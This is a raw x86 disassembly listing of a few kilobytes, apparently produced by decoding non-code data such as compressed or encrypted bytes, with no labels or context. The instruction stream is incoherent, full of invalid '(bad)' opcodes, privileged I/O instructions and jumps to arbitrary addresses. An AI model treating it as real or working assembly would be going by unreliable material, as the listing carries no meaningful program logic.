  439e43:	arpl   WORD PTR [esi],dx
  439e45:	sbb    edi,edi
  439e47:	sbb    edx,DWORD PTR [edi+eax*1]
  439e4a:	cmp    edi,eax
  439e4c:	add    edx,DWORD PTR [eax+0x28b6ff8a]
  439e52:	xchg   esp,eax
  439e53:	ins    DWORD PTR es:[edi],dx
  439e54:	mov    eax,0xc862c273
  439e59:	jae    0x439e19
  439e5b:	pop    es
  439e5c:	fsub   QWORD PTR [ecx]
  439e5e:	mov    al,0xe
  439e60:	scas   eax,DWORD PTR es:[edi]
  439e61:	pop    es
  439e62:	or     al,0xdf
  439e64:	jmp    0x6c97:0x9c76a558
  439e6b:	(bad)  
  439e6c:	adc    BYTE PTR [ebp-0x6b],dl
  439e6f:	xlat   BYTE PTR ds:[ebx]
  439e70:	cli    
  439e71:	retf   
  439e72:	or     DWORD PTR [esi],0xffffffa5
  439e75:	fild   QWORD PTR [eax]
  439e77:	pop    ebx
  439e78:	int    0x1b
  439e7a:	mov    WORD PTR [edi-0x6966bc83],es
  439e80:	sub    eax,0xe1b6ba78
  439e85:	(bad)  
  439e87:	fwait
  439e88:	mov    ebp,0x76a7d677
  439e8d:	mov    WORD PTR [edx-0x1ba3bef2],?
  439e93:	jmp    0x3341c5e6
  439e98:	fst    DWORD PTR [eax]
  439e9a:	out    dx,eax
  439e9b:	xor    dl,ch
  439e9d:	jecxz  0x439eaa
  439e9f:	loope  0x439e8b
  439ea1:	add    BYTE PTR [eax],al
  439ea3:	add    BYTE PTR [eax],al
  439ea5:	add    BYTE PTR [ebp-0x70c68942],ch
  439eab:	retf   
  439eac:	add    dl,BYTE PTR [ecx-0xac36a28]
  439eb2:	pop    ebx
  439eb3:	mov    WORD PTR [esi],cs
  439eb5:	les    esp,FWORD PTR [edi+0xb]
  439eb8:	fucomip st,st(2)
  439eba:	mov    edi,DWORD PTR [esi-0x1484a65]
  439ec0:	not    BYTE PTR [esi+0x62ea99c7]
  439ec6:	push   0x586202cf
  439ecb:	iret   
  439ecc:	(bad)  
  439ecd:	cmp    BYTE PTR [edi+0x3438e9aa],bh
  439ed3:	cs push ebx
  439ed5:	or     eax,0x5432820
  439eda:	sbb    al,0x2e
  439edc:	pop    ss
  439edd:	add    BYTE PTR [ebx+0x5e],bh
  439ee0:	out    0x51,eax
  439ee2:	cmp    eax,0x7d0fcf2a
  439ee7:	xchg   eax,ebp
  439ee9:	push   DWORD PTR [esi]
  439eeb:	adc    al,0x6b
  439eed:	and    al,0xc9
  439eef:	adc    edx,DWORD PTR [ebx+0x24]
  439ef2:	cmc    
  439ef3:	pop    esi
  439ef4:	xchg   ebx,eax
  439ef5:	adc    BYTE PTR [esi],al
  439ef7:	pop    ebp
  439ef8:	adc    cl,BYTE PTR [ebx+0x50e757ee]
  439efe:	loope  0x439f24
  439f00:	xchg   ebx,eax
  439f01:	add    cl,ch
  439f03:	scas   al,BYTE PTR es:[edi]
  439f04:	pop    ecx
  439f05:	mov    esi,edi
  439f07:	not    BYTE PTR [ecx+0xf7]
  439f0d:	add    BYTE PTR [eax],al
  439f0f:	add    BYTE PTR ss:[eax+0x5e],cl
  439f13:	aam    0x43
  439f15:	imul   eax,esp,0xeacd5
  439f1b:	jp     0x439f77
  439f1d:	xchg   ebx,eax
  439f1e:	in     al,dx
  439f1f:	cmp    bl,dh
  439f21:	call   0x2257:0x3caea900
  439f28:	std    
  439f29:	xchg   ebx,eax
  439f2a:	stc    
  439f2b:	bnd jb 0x439f40
  439f2e:	lea    ebx,[edx+edi*8]
  439f31:	mul    BYTE PTR [edx+0x3b]
  439f34:	in     eax,0xe7
  439f36:	lea    ebp,[edx+edi*8]
  439f39:	cmp    al,0x50
  439f3b:	hlt    
  439f3c:	cmp    ah,BYTE PTR [ebx-0x1]
  439f3f:	xchg   esi,eax
  439f40:	in     al,0x70
  439f42:	sub    cl,bh
  439f44:	in     eax,dx
  439f45:	cwde   
  439f46:	push   esp
  439f47:	push   esp
  439f48:	in     al,0x6b
  439f4a:	les    ebp,FWORD PTR [ecx+0x3b]
  439f4d:	iret   
  439f4e:	jle    0x439fab
  439f50:	adc    DWORD PTR [eax],edx
  439f52:	lea    eax,[esi+ecx*4+0x6aa48d59]
  439f59:	out    0xff,eax
  439f5b:	nop
  439f5c:	push   0xc27509e
  439f61:	add    BYTE PTR [bx+si-0x6e65],dl
  439f66:	rcr    BYTE PTR [ebp-0x67b4947b],0x73
  439f6d:	loope  0x439fcc
  439f6f:	push   es
  439f70:	popa   
  439f71:	dec    esp
  439f72:	inc    BYTE PTR [eax]
  439f74:	add    BYTE PTR [eax],al
  439f76:	add    BYTE PTR [eax],al
  439f78:	ret    0xa05b
  439f7b:	pop    ecx
  439f7c:	leave  
  439f7d:	pop    ebp
  439f7e:	pop    ss
  439f7f:	add    BYTE PTR [ecx],dl
  439f81:	cmp    BYTE PTR [ebx-0x5c647000],bl
  439f87:	push   edx
  439f88:	inc    esi
  439f89:	add    al,0x87
  439f8b:	and    al,0xc4
  439f8d:	fwait
  439f8e:	push   cs
  439f8f:	add    BYTE PTR [ebx],bl
  439f91:	and    ebp,DWORD PTR [eax+0xe9c2267]
  439f97:	add    BYTE PTR [ebx],cl
  439f99:	int    0x6b
  439f9b:	retf   0x5009
  439f9e:	xor    bh,BYTE PTR [eax+edi*4]
  439fa1:	data16 aas 
  439fa3:	stc    
  439fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439fa5:	adc    al,0x5b
  439fa7:	push   0xe9c05
  439fac:	or     ebp,DWORD PTR [ebp+0x4719ca6b]
  439fb2:	xor    ch,BYTE PTR [eax]
  439fb4:	js     0x43a028
  439fb6:	aas    
  439fb7:	stc    
  439fb8:	jg     0x439fbe
  439fba:	and    al,0x68
  439fbc:	push   ds
  439fbd:	fwait
  439fbe:	push   cs
  439fbf:	add    BYTE PTR [ebx],bl
  439fc1:	fldenv [ebp+0x44]
  439fc4:	lods   al,BYTE PTR ds:[esi]
  439fc5:	add    DWORD PTR [esi+0x51],0x5f
  439fc9:	mov    eax,0x2343853f
  439fce:	arpl   WORD PTR [eax],ax
  439fd0:	nop
  439fd1:	fwait
  439fd2:	imul   ecx,edx,0x1b
  439fd5:	mov    bl,0x4a
  439fd7:	inc    ecx
  439fd8:	aas    
  439fd9:	mov    dl,0xf0
  439fdb:	push   eax
  439fdc:	add    BYTE PTR [eax],al
  439fde:	add    BYTE PTR [eax],al
  439fe0:	add    BYTE PTR ds:0x90784065,cl
  439fe6:	mov    dl,0xf7
  439fe8:	jl     0x43a044
  439fea:	cmp    esi,DWORD PTR [eax+ebp*1]
  439fed:	je     0x439f89
  439fef:	jmp    0x43a041
  439ff1:	sbb    DWORD PTR [ecx+0x6a155073],edx
  439ff7:	icebp  
  439ff8:	jbe    0x439fca
  439ffa:	cmp    DWORD PTR [eax+ebp*1],esi
  439ffd:	lea    esi,[esi]
  439fff:	mov    eax,0xf6f00c00
  43a004:	add    edx,DWORD PTR [eax-0x1e837f3b]
  43a00a:	cmp    bl,BYTE PTR [eax+ebp*1]
  43a00d:	test   al,0x3b
  43a00f:	in     al,dx
  43a010:	daa    
  43a011:	js     0x43a04a
  43a013:	fwait
  43a014:	xlat   BYTE PTR ds:[ebx]
  43a015:	cwde   
  43a016:	aas    
  43a017:	or     al,0x28
  43a019:	test   al,0x3d
  43a01b:	mov    ebx,DWORD PTR [ebx+0x2b]
  43a01e:	mov    ebx,0x60d03f7
  43a023:	adc    al,0xec
  43a025:	pushw  cs
  43a027:	sbb    al,0xf8
  43a029:	and    eax,ebp
  43a02b:	dec    edx
  43a02c:	mov    bh,0x73
  43a02e:	fimul  WORD PTR [esi-0x84d6f83]
  43a034:	pop    ebx
  43a035:	cmc    
  43a036:	loope  0x43a058
  43a038:	push   eax
  43a039:	sbb    esi,edi
  43a03b:	adc    esp,DWORD PTR [eax]
  43a03d:	jns    0x43a046
  43a03f:	fdivr  st(7),st
  43a041:	(bad)  
  43a042:	cmp    eax,0x27b4
  43a047:	add    BYTE PTR [eax],al
  43a049:	add    ah,al
  43a04b:	sbb    al,0xf4
  43a04d:	mov    bl,0x6f
  43a04f:	sub    ah,BYTE PTR [ebp+0x3c34594e]
  43a055:	repz or ah,bh
  43a058:	rcr    DWORD PTR [ebx],cl
  43a05a:	sbb    edi,edi
  43a05c:	push   cs
  43a05d:	int    0x7
  43a05f:	cwde   
  43a060:	pop    ds
  43a061:	loopne 0x439ff6
  43a063:	mov    dl,0x3d
  43a065:	out    0x39,al
  43a067:	and    ch,bh
  43a069:	sub    BYTE PTR [ebx+esi*1+0xe0fe6c6],dl
  43a070:	psubsw mm2,QWORD PTR [ebx+0x45e8e70d]
  43a077:	or     dl,BYTE PTR [esi+0x107015b1]
  43a07d:	jmp    0xe4abd315
  43a082:	cmp    al,0xf
  43a084:	fsub   DWORD PTR [edi-0x7f83fb33]
  43a08a:	mov    edx,DWORD PTR [eax-0x40]
  43a08d:	xchg   ecx,eax
  43a08e:	div    BYTE PTR gs:[edx]
  43a091:	mov    ebp,0xae95b3b8
  43a096:	cmp    esi,DWORD PTR [ecx-0x36934e6b]
  43a09c:	xor    esi,DWORD PTR [esi+0x57]
  43a09f:	aaa    
  43a0a0:	push   ebx
  43a0a1:	lds    esp,FWORD PTR [ebx-0x92230cd]
  43a0a7:	ss mov edi,0x8a9a6b72
  43a0ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a0ae:	add    BYTE PTR [eax],al
  43a0b0:	add    BYTE PTR [eax],al
  43a0b2:	add    BYTE PTR [eax-0x77],al
  43a0b5:	xchg   ebx,eax
  43a0b6:	sub    DWORD PTR [eax+0x6fad9bc8],edi
  43a0bc:	stos   BYTE PTR es:[edi],al
  43a0bd:	ds xchg esi,eax
  43a0bf:	inc    esi
  43a0c0:	loop   0x43a0ab
  43a0c2:	jge    0x43a07c
  43a0c4:	outs   dx,BYTE PTR ds:[esi]
  43a0c5:	psubsw mm2,QWORD PTR [ebx+0x53cd533b]
  43a0cc:	loop   0x43a10c
  43a0ce:	push   ds
  43a0cf:	imul   esp,DWORD PTR [ebx],0xd93a8ff
  43a0d5:	out    0xe8,eax
  43a0d7:	cmp    BYTE PTR [eax-0x290aff6b],ch
  43a0dd:	push   es
  43a0de:	mov    edi,ebp
  43a0e0:	(bad)  
  43a0e1:	or     ch,al
  43a0e3:	mov    bh,0x4c
  43a0e5:	in     eax,0xff
  43a0e7:	mov    dl,0xfe
  43a0e9:	out    0x74,eax
  43a0eb:	test   DWORD PTR [edx-0x7b3aea19],eax
  43a0f1:	sub    al,BYTE PTR [eax]
  43a0f3:	mov    dl,0x4f
  43a0f5:	xor    BYTE PTR cs:[ecx-0x7f],dl
  43a0f9:	sub    eax,0x43324eff
  43a0fe:	and    al,0x55
  43a100:	cmp    eax,0xb2f9009a
  43a105:	mul    BYTE PTR [esi-0x72180067]
  43a10b:	mov    ch,0xda
  43a10d:	sub    bh,BYTE PTR [ecx+0xeb313]
  43a113:	adc    DWORD PTR [ebx],ebx
  43a115:	aas    
  43a116:	inc    DWORD PTR [eax]
  43a118:	add    BYTE PTR [eax],al
  43a11a:	add    BYTE PTR [eax],al
  43a11c:	push   cs
  43a11d:	or     al,0x43
  43a11f:	and    al,0xc9
  43a121:	cmp    eax,0xb6794eef
  43a126:	xchg   ebx,eax
  43a127:	shl    DWORD PTR [eax+eax*1],0x18
  43a12b:	inc    ebp
  43a12c:	test   BYTE PTR [edx-0x6d],0xc1
  43a130:	and    al,0xc1
  43a132:	pop    ss
  43a133:	inc    ebp
  43a134:	jnp    0x43a179
  43a136:	xchg   ebp,eax
  43a137:	inc    esp
  43a138:	xchg   ebp,eax
  43a139:	jp     0x43a0c8
  43a13b:	div    BYTE PTR [edx]
  43a13d:	daa    
  43a13e:	xor    ebx,esp
  43a140:	test   eax,0x340f0eb2
  43a145:	retf   0xff59
  43a148:	inc    ebp
  43a149:	(bad)  
  43a14a:	and    cl,BYTE PTR [ebp-0x9d29cb]
  43a150:	adc    eax,0x5ff22d6
  43a155:	(bad)  
  43a156:	pop    edx
  43a157:	push   eax
  43a158:	nop
  43a159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a15a:	add    edi,ecx
  43a15c:	test   DWORD PTR [ebx],ebp
  43a15e:	loopne 0x43a19f
  43a160:	nop
  43a161:	sub    esp,DWORD PTR [edi+eiz*8-0x6c0d743]
  43a168:	adc    esp,eax
  43a16a:	xor    DWORD PTR [ebp+0x24afb44f],eax
  43a170:	aaa    
  43a171:	xchg   ebp,eax
  43a172:	push   0x67b7747c
  43a177:	xor    edi,DWORD PTR [eax+ecx*4+0x7cc6ffce]
  43a17e:	and    ecx,edi
  43a180:	add    BYTE PTR [eax],al
  43a182:	add    BYTE PTR [eax],al
  43a184:	add    BYTE PTR [edi+edi*4-0x5919071a],bl
  43a18b:	pop    ebx
  43a18c:	rol    BYTE PTR [edi],cl
  43a18e:	shl    BYTE PTR [esi],1
  43a190:	and    bh,bh
  43a192:	and    eax,0x1def8a0
  43a197:	xlat   BYTE PTR ds:[ebx]
  43a198:	and    eax,DWORD PTR [ebx+0x4b5ab8cc]
  43a19e:	sbb    dl,BYTE PTR [edi-0x48]
  43a1a1:	nop
  43a1a2:	fwait
  43a1a3:	push   cs
  43a1a4:	mov    esi,0xec8d9b84
  43a1a9:	add    al,0x9a
  43a1ab:	push   cs
  43a1ac:	add    BYTE PTR [ebx],bl
  43a1ae:	lock ss mov eax,0x2d0e9b92
  43a1b5:	rol    BYTE PTR [edx],1
  43a1b7:	pop    ss
  43a1b8:	and    al,0x1b
  43a1ba:	sbb    BYTE PTR [edi],dh
  43a1bc:	mov    esp,0x7d0e9b92
  43a1c1:	ror    BYTE PTR [edi-0x7893b39b],1
  43a1c7:	sahf   
  43a1c8:	mov    bl,BYTE PTR [edi+esi*4]
  43a1cb:	add    BYTE PTR [eax],0x90
  43a1ce:	fwait
  43a1cf:	inc    esi
  43a1d0:	sub    DWORD PTR [edx-0x22],esp
  43a1d3:	pop    ebx
  43a1d4:	adc    DWORD PTR [eax-0x4e],0xffffffe0
  43a1d8:	xchg   DWORD PTR [ecx-0x3dfc0850],edi
  43a1de:	aas    
  43a1df:	jl     0x43a209
  43a1e1:	and    BYTE PTR [edx-0x1c3ffc09],dh
  43a1e7:	(bad)  
  43a1e8:	rol    BYTE PTR [eax],0x0
  43a1eb:	add    BYTE PTR [eax],al
  43a1ed:	add    BYTE PTR [ebx-0x42],dh
  43a1f0:	(bad)  
  43a1f1:	fsub   st(1),st
  43a1f3:	mov    ecx,fs
  43a1f5:	js     0x43a1bb
  43a1f7:	(bad)  
  43a1f8:	xrelease xchg DWORD PTR [eax-0x43],edx
  43a1fc:	jnp    0x43a204
  43a1fe:	cs (bad) 
  43a200:	clc    
  43a201:	js     0x43a195
  43a203:	aas    
  43a204:	xor    al,0x28
  43a206:	mov    bl,ah
  43a208:	and    DWORD PTR [ebp+0x0],ecx
  43a20b:	inc    esi
  43a20c:	clc    
  43a20d:	add    edx,DWORD PTR [eax+0x12fcb837]
  43a213:	popf   
  43a214:	test   DWORD PTR [ebx],0x28343990
  43a21a:	mov    BYTE PTR [edi],bh
  43a21c:	sub    al,0x28
  43a21e:	xchg   esp,eax
  43a21f:	cmp    eax,esp
  43a221:	mov    cl,0x57
  43a223:	lea    esp,[edi]
  43a225:	lock adc dh,BYTE PTR [edx-0x37]
  43a229:	xchg   dl,cl
  43a22b:	mov    dl,0xf7
  43a22d:	add    ebx,DWORD PTR [ebp+0x3f]
  43a230:	add    al,0x28
  43a232:	je     0x43a27f
  43a234:	jae    0x43a239
  43a236:	nop
  43a237:	mov    dl,0x8f
  43a239:	xchg   DWORD PTR [ecx-0x73],ecx
  43a23c:	jno    0x43a2b6
  43a23e:	inc    esp
  43a23f:	(bad)  
  43a240:	(bad)  
  43a242:	test   al,0x17
  43a244:	bnd jle 0x43a293
  43a247:	(bad)  
  43a248:	add    ebx,DWORD PTR [ecx+eiz*4-0x1f]
  43a24c:	push   edx
  43a24d:	dec    esp
  43a24e:	mov    DWORD PTR [edi],eax
  43a250:	adc    al,0xfc
  43a252:	add    BYTE PTR [eax],al
  43a254:	add    BYTE PTR [eax],al
  43a256:	add    BYTE PTR [ebx+ebp*2],cl
  43a259:	(bad)  
  43a25b:	test   al,0xa4
  43a25d:	lds    ebp,FWORD PTR [esi]
  43a25f:	jle    0x43a241
  43a261:	std    
  43a262:	test   al,0x93
  43a264:	mov    dh,cl
  43a266:	out    dx,al
  43a267:	mov    eax,cr2
  43a26a:	jmp    0xb7128002
  43a26f:	(bad)  
  43a270:	out    0x32,al
  43a272:	mov    ecx,0xe90f391a
  43a277:	xchg   ebx,eax
  43a278:	xor    edx,DWORD PTR [ebx-0x33]
  43a27b:	aas    
  43a27c:	xchg   esp,eax
  43a27d:	push   ecx
  43a27e:	sahf   
  43a27f:	les    ecx,FWORD PTR [ecx-0x5d8fd26a]
  43a285:	fwait
  43a286:	xor    eax,0xe195de70
  43a28b:	in     eax,0x38
  43a28d:	inc    ebx
  43a28e:	add    eax,0xc63efc80
  43a293:	test   DWORD PTR [esi],esp
  43a295:	psubsw mm2,QWORD PTR [ebx+0x53ccf2f]
  43a29c:	aaa    
  43a29d:	pop    ebx
  43a29e:	add    eax,0x461b9a98
  43a2a3:	pop    edx
  43a2a4:	mov    DWORD PTR [esi+0x330e65a1],edx
  43a2aa:	std    
  43a2ab:	ds mov edx,0x8a57a91d
  43a2b1:	cwde   
  43a2b2:	sub    eax,0x6c43a670
  43a2b7:	add    al,dl
  43a2b9:	inc    edx
  43a2ba:	xor    BYTE PTR [eax],al
  43a2bc:	add    BYTE PTR [eax],al
  43a2be:	add    BYTE PTR [eax],al
  43a2c0:	cmp    esi,DWORD PTR [edx-0x72a416f2]
  43a2c6:	pop    ecx
  43a2c7:	pop    bx
  43a2c9:	xor    eax,0x38a00553
  43a2ce:	inc    ebx
  43a2cf:	or     eax,0xbb173578
  43a2d4:	sbb    dh,ah
  43a2d6:	xor    al,BYTE PTR [eax]
  43a2d8:	xor    DWORD PTR [ebp+0x5a],eax
  43a2db:	(bad)  
  43a2dc:	call   0x6943b1e3
  43a2e1:	xor    cl,bh
  43a2e3:	jne    0x43a357
  43a2e5:	or     al,0x5b
  43a2e7:	and    al,0x45
  43a2e9:	out    0xd1,eax
  43a2eb:	pop    esi
  43a2ec:	xchg   edi,esi
  43a2ee:	repz add bh,BYTE PTR [edx]
  43a2f1:	out    dx,eax
  43a2f2:	xchg   ebp,eax
  43a2f3:	push   esp
  43a2f4:	dec    ebp
  43a2f5:	jae    0x43a298
  43a2f7:	nop
  43a2f8:	cmp    DWORD PTR [edi-0x115e74f2],ebp
  43a2fe:	ror    DWORD PTR [esi+0x46],cl
  43a301:	clc    
  43a302:	xchg   ebx,eax
  43a303:	dec    esp
  43a304:	dec    ebp
  43a305:	xchg   ebx,eax
  43a306:	xchg   ebx,eax
  43a307:	inc    ecx
  43a308:	cmp    eax,0x794eef3e
  43a30d:	mov    dh,0x8d
  43a30f:	sar    BYTE PTR [ebp-0x302dc476],0xbd
  43a316:	(bad)  
  43a317:	mov    ecx,0x4f5125
  43a31c:	mov    esp,0x72d193b4
  43a321:	test   BYTE PTR [ebp+0xed],0x0
  43a328:	add    dh,dl
  43a32a:	jno    0x43a2f9
  43a32c:	push   eax
  43a32d:	jl     0x43a327
  43a32f:	pop    ss
  43a330:	inc    ebp
  43a331:	ss inc esi
  43a333:	pop    esp
  43a334:	lea    ebp,[ebp-0x55]
  43a337:	xchg   esi,eax
  43a338:	add    cl,ch
  43a33a:	scas   al,BYTE PTR es:[edi]
  43a33b:	lea    edi,ds:[ebp-0x2e]
  43a33f:	cs push eax
  43a341:	and    DWORD PTR [ebx+0x59],edi
  43a344:	std    
  43a345:	inc    esi
  43a346:	xor    al,0xd3
  43a348:	adc    al,0x32
  43a34a:	mul    edi
  43a34c:	je     0x43a2eb
  43a34e:	sahf   
  43a34f:	out    0x15,eax
  43a351:	fld    QWORD PTR [ebx+0x4e90002a]
  43a357:	push   ebp
  43a358:	adc    edi,DWORD PTR [eax+ecx*4]
  43a35b:	into   
  43a35c:	inc    edx
  43a35e:	fnsetpm(287 only) 
  43a360:	mov    cl,0x5b
  43a362:	andnps xmm1,XMMWORD PTR [ecx]
  43a365:	into   
  43a366:	shr    DWORD PTR [ecx-0x39],cl
  43a369:	xchg   DWORD PTR [edi],ecx
  43a36b:	jb     0x43a36d
  43a36d:	nop
  43a36e:	fwait
  43a36f:	addr16 push esp
  43a371:	lods   al,BYTE PTR ds:[esi]
  43a372:	jnp    0x43a30f
  43a374:	xchg   edi,eax
  43a375:	nop
  43a376:	fwait
  43a377:	push   cs
  43a378:	call   0xf998cd3b
  43a37d:	sbb    esp,DWORD PTR [eax]
  43a37f:	or     bl,BYTE PTR [edx*1-0x1feff5b0]
  43a386:	sbb    cl,0x23
  43a389:	cwde   
  43a38a:	out    0xd6,al
  43a38c:	pop    es
  43a38d:	add    BYTE PTR [eax],al
  43a38f:	add    BYTE PTR [eax],al
  43a391:	add    bh,al
  43a393:	(bad)  
  43a394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a395:	and    esi,DWORD PTR [ebx+eiz*2-0xb]
  43a399:	sti    
  43a39a:	pop    ds
  43a39b:	popa   
  43a39c:	add    al,0xc7
  43a39e:	xchg   DWORD PTR [ecx],esp
  43a3a0:	ss aas 
  43a3a2:	adc    al,0x5c
  43a3a4:	call   0x9f5a8ceb
  43a3a9:	and    esi,DWORD PTR [eax-0x6fff84fe]
  43a3af:	fwait
  43a3b0:	inc    esi
  43a3b1:	sbb    eax,0x8b58505e
  43a3b6:	dec    esp
  43a3b7:	outs   dx,DWORD PTR ds:[esi]
  43a3b8:	fimul  WORD PTR [edi-0x21]
  43a3bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a3bc:	sbb    BYTE PTR cs:0x67282ea8,al
  43a3c3:	and    eax,DWORD PTR [ecx-0xb]
  43a3c6:	(bad)  
  43a3c7:	or     BYTE PTR [edi+0x589d44c0],cl
  43a3cd:	mov    ebp,0x202ea005
  43a3d2:	jmp    0x90480c89
  43a3d7:	mov    dl,0x3f
  43a3d9:	dec    eax
  43a3da:	dec    ebx
  43a3db:	mov    DWORD PTR [ecx+0x77],eax
  43a3de:	dec    esp
  43a3df:	into   
  43a3e0:	out    0xb3,eax
  43a3e2:	mov    dh,bh
  43a3e4:	sbb    ebp,esp
  43a3e6:	sbb    dh,dh
  43a3e8:	adc    ebx,DWORD PTR [ecx+eiz*8]
  43a3eb:	call   0x4474:0x89794d2d
  43a3f2:	in     al,0xb4
  43a3f4:	xor    DWORD PTR [ebp+0x0],eax
  43a3f7:	add    BYTE PTR [eax],al
  43a3f9:	add    BYTE PTR [eax],al
  43a3fb:	or     al,0x6d
  43a3fd:	test   cl,bh
  43a3ff:	adc    al,0xde
  43a401:	fcomi  st,st(3)
  43a403:	in     eax,dx
  43a404:	mov    DWORD PTR [ebx-0x49],ecx
  43a407:	xchg   ebx,eax
  43a408:	call   0xb85d:0x894abbf7
  43a40f:	jae    0x43a3b3
  43a411:	mov    cr2,esi
  43a414:	mov    ecx,edi
  43a416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a417:	enter  0x5ced,0xbf
  43a41b:	jae    0x43a3d7
  43a41d:	daa    
  43a41e:	jge    0x43a3a8
  43a420:	mov    DWORD PTR [edi],esp
  43a422:	cld    
  43a423:	adc    al,BYTE PTR [eax-0x4feafdbc]
  43a429:	or     DWORD PTR [ecx+0x60],ecx
  43a42c:	mov    edx,0x32d01509
  43a431:	mov    esp,0xf888f68f
  43a436:	inc    ebp
  43a437:	cwde   
  43a438:	mov    dl,0x2a
  43a43a:	jge    0x43a430
  43a43c:	xor    bl,BYTE PTR [edi+eiz*2-0x4b077722]
  43a443:	or     eax,0x143ac56b
  43a448:	ins    DWORD PTR es:[edi],dx
  43a449:	loope  0x43a4b9
  43a44b:	pop    es
  43a44c:	loopne 0x43a44e
  43a44e:	ja     0x43a473
  43a450:	add    cl,BYTE PTR [edi]
  43a452:	jbe    0x43a49c
  43a454:	mov    edx,edx
  43a456:	and    al,0x48
  43a458:	xchg   edx,eax
  43a459:	mov    cl,0xa9
  43a45b:	xchg   ebx,eax
  43a45c:	or     eax,edx
  43a45e:	add    BYTE PTR [bx+si],al
  43a461:	add    BYTE PTR [eax],al
  43a463:	add    BYTE PTR [ebx-0x34bef14e],dl
  43a469:	sti    
  43a46a:	jmp    0xbf27aabd
  43a46f:	or     BYTE PTR [ebx],0xb3
  43a472:	push   cs
  43a473:	jmp    0x369fb253
  43a478:	enter  0x943b,0xc1
  43a47c:	(bad)  
  43a47d:	mov    edx,ebp
  43a47f:	mov    eax,0x39543d23
  43a484:	or     BYTE PTR [eax-0x1cec1616],cl
  43a48a:	fwait
  43a48b:	je     0x43a4f0
  43a48d:	mov    ebp,edx
  43a48f:	push   es
  43a490:	les    edi,FWORD PTR [ecx-0x9]
  43a493:	lahf   
  43a494:	les    ecx,FWORD PTR [ecx-0x462c9316]
  43a49a:	xchg   edx,eax
  43a49b:	and    BYTE PTR [ebx-0x2b95f14e],dl
  43a4a1:	mov    DWORD PTR [edx],ebx
  43a4a3:	gs aam 0xb2
  43a4a6:	push   cs
  43a4a7:	jmp    0x34e0292e
  43a4ac:	push   eax
  43a4ad:	aas    
  43a4ae:	cwde   
  43a4af:	jmp    0x34db5747
  43a4b4:	fs call 0x249c:0x894f2435
  43a4bc:	pop    eax
  43a4bd:	loop   0x43a533
  43a4bf:	call   0x19d7e1f9
  43a4c4:	push   edi
  43a4c5:	mov    edx,ebp
  43a4c7:	cmp    DWORD PTR [eax],eax
  43a4c9:	add    BYTE PTR [eax],al
  43a4cb:	add    BYTE PTR [eax],al
  43a4cd:	daa    
  43a4ce:	xor    DWORD PTR [ebp+ecx*4+0x4d],ebp
  43a4d2:	add    esp,edi
  43a4d4:	add    BYTE PTR [esi],cl
  43a4d6:	add    BYTE PTR [edx+0x10],0x69
  43a4da:	scas   al,BYTE PTR es:[edi]
  43a4db:	(bad)  
  43a4dc:	shl    BYTE PTR [ecx+eax*4+0x3e214595],0x40
  43a4e4:	(bad)  
  43a4e5:	in     al,0xc7
  43a4e7:	xchg   ebp,eax
  43a4e8:	dec    ebp
  43a4e9:	cmp    eax,0x3e94b5e6
  43a4ee:	out    dx,eax
  43a4ef:	repz add edi,edx
  43a4f2:	(bad)  
  43a4f3:	out    0x89,eax
  43a4f5:	xor    al,0xf7
  43a4f7:	imul   edi,eax,0xffffffbe
  43a4fa:	popa   
  43a4fb:	sbb    ch,BYTE PTR [edx+0x71]
  43a4fe:	or     cl,BYTE PTR [esi-0xc]
  43a501:	pop    es
  43a502:	inc    ebx
  43a503:	out    0x15,eax
  43a505:	sbb    DWORD PTR [ebp-0xd15ffd6],edx
  43a50b:	sbb    cl,BYTE PTR [ebp-0x7a5dfcec]
  43a511:	cmp    DWORD PTR [ebx+0x4aa8e80e],esi
  43a517:	out    0xff,eax
  43a519:	lods   al,BYTE PTR ds:[esi]
  43a51a:	jno    0x43a4b6
  43a51c:	mov    esp,esp
  43a51e:	jmp    0xd04e:0x62d4595
  43a525:	pushf  
  43a526:	xor    dh,BYTE PTR [edi-0x3]
  43a529:	ds lock xchg ecx,eax
  43a52c:	inc    ebp
  43a52d:	aad    0x9
  43a52f:	dec    esi
  43a530:	call   0x43a535
  43a535:	add    BYTE PTR [eax+0x72],dh
  43a538:	(bad)  
  43a539:	lea    esi,[ebx+ebp*2-0x1b]
  43a53d:	(bad)  
  43a53e:	ds inc ebx
  43a540:	xchg   ebp,eax
  43a541:	dec    ebp
  43a542:	sbb    eax,ecx
  43a544:	dec    ebp
  43a545:	fdiv   st,st(4)
  43a547:	mov    dl,0xe
  43a549:	add    BYTE PTR [esi],dh
  43a54b:	jb     0x43a517
  43a54d:	add    ecx,ebp
  43a54f:	mov    dl,0xe
  43a551:	(bad)  
  43a552:	nop
  43a553:	(bad)  
  43a554:	outs   dx,BYTE PTR ds:[esi]
  43a555:	dec    bh
  43a557:	cwde   
  43a558:	push   cs
  43a559:	call   0xf9976e3a
  43a55e:	sub    DWORD PTR [ebx],0x6a
  43a561:	aad    0x87
  43a563:	out    0x4f,al
  43a565:	dec    edi
  43a566:	sbb    esp,DWORD PTR [esi+0x3d27f42]
  43a56c:	push   cs
  43a56d:	add    BYTE PTR [eax-0x68112c1f],dl
  43a573:	fbstp  TBYTE PTR [eax+0x4cd2eb59]
  43a579:	jg     0x43a5ef
  43a57b:	add    BYTE PTR [eax],dl
  43a57d:	add    BYTE PTR [eax-0x2fdc45ea],dl
  43a583:	sub    BYTE PTR [edi-0x2d8e38af],bl
  43a589:	push   esi
  43a58a:	js     0x43a5c7
  43a58c:	mov    ds:0x6a175ff8,al
  43a591:	and    al,0x0
  43a593:	pushf  
  43a594:	push   cs
  43a595:	add    cl,ah
  43a597:	dec    ebx
  43a598:	std    
  43a599:	aam    0x0
  43a59b:	add    BYTE PTR [eax],al
  43a59d:	add    BYTE PTR [eax],al
  43a59f:	jecxz  0x43a59f
  43a5a1:	mov    ecx,0xff2dc23
  43a5a6:	add    BYTE PTR [eax+0x258461b],dl
  43a5ac:	xchg   ebp,eax
  43a5ad:	push   esp
  43a5ae:	jge    0x43a5d8
  43a5b0:	(bad)  
  43a5b1:	in     al,0x83
  43a5b3:	xlat   BYTE PTR ds:[ebx]
  43a5b4:	cdq    
  43a5b5:	push   cs
  43a5b6:	add    BYTE PTR ds:0xcf83e45c,cl
  43a5bc:	cdq    
  43a5bd:	push   cs
  43a5be:	add    BYTE PTR ds:0x90902f18,dl
